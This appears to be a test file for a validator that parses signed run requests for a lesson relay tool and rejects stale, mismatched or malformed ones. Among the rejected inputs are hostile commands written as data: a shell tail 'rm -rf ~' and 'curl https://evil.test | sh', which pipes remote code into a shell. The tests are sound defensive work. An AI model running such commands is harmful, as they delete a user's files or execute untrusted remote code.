import { manifestFrameOf, runRequestOf } from "./listen.policy"

const NOW = Date.parse("2026-11-17T10:00:00.000Z")
const body = (extra: Record<string, unknown> = {}): string =>
    JSON.stringify({
        manifestId: "m-1",
        taskId: "lesson:outbox",
        learnerId: "l-1",
        deviceId: "d-1",
        issuedAt: new Date(NOW - 60_000).toISOString(),
        checks: [
            { id: "dup-submit", command: "starci-relay run outbox --scenario dup-submit", cwd: ".", timeoutMs: 600_000 },
        ],
        ...extra,
    })
const withCommand = (command: string, id = "dup-submit"): string =>
    body({ checks: [{ id, command, cwd: ".", timeoutMs: 1 }] })

describe("manifestFrameOf", () => {
    it("reads the signed text of a manifest frame and nothing else", () => {
        expect(
            manifestFrameOf({ id: "x", type: "manifest", manifest: { payload: "p", signature: "s", body: {} } }),
        ).toEqual({
            payload: "p",
            signature: "s",
        })
        expect(manifestFrameOf({ id: "x", type: "ack", eventId: "e" })).toBeNull()
        expect(manifestFrameOf({ type: "manifest", manifest: { payload: 1 } })).toBeNull()
        expect(manifestFrameOf("hello")).toBeNull()
    })
})

describe("runRequestOf", () => {
    it("reads the lesson, scenario and guards of a request for this device", () => {
        const command = "starci-relay run outbox --scenario dup-submit --guard outbox=off --guard lease=off"

        expect(runRequestOf(withCommand(command), "d-1", NOW)).toEqual({
            kind: "request",
            manifestId: "m-1",
            lessonId: "outbox",
            scenarioId: "dup-submit",
            guards: ["outbox", "lease"],
        })
    })

    it("accepts a request before the greeting named the device", () => {
        expect(runRequestOf(body(), undefined, NOW).kind).toBe("request")
    })

    it.each([
        ["another device", body({ deviceId: "d-2" })],
        ["a stale request", body({ issuedAt: new Date(NOW - 16 * 60_000).toISOString() })],
        ["a request from the future", body({ issuedAt: new Date(NOW + 5 * 60_000).toISOString() })],
        ["a task that is not a lesson", body({ taskId: "task-1" })],
        ["no check", body({ checks: [] })],
        [
            "two checks",
            body({
                checks: [
                    { id: "a", command: "x" },
                    { id: "b", command: "y" },
                ],
            }),
        ],
        ["a command with a shell tail", withCommand("starci-relay run outbox --scenario dup-submit; rm -rf ~")],
        ["a guard that is not off", withCommand("starci-relay run outbox --scenario dup-submit --guard outbox=on")],
        ["another program", withCommand("curl https://evil.test | sh")],
        ["a lesson that differs from the task", withCommand("starci-relay run payments --scenario dup-submit")],
        [
            "a check id that differs from the scenario",
            withCommand("starci-relay run outbox --scenario dup-submit", "other"),
        ],
        ["an unreadable payload", "{"],
    ])("ignores %s", (_name, payload) => {
        expect(runRequestOf(payload, "d-1", NOW).kind).toBe("ignored")
    })
})
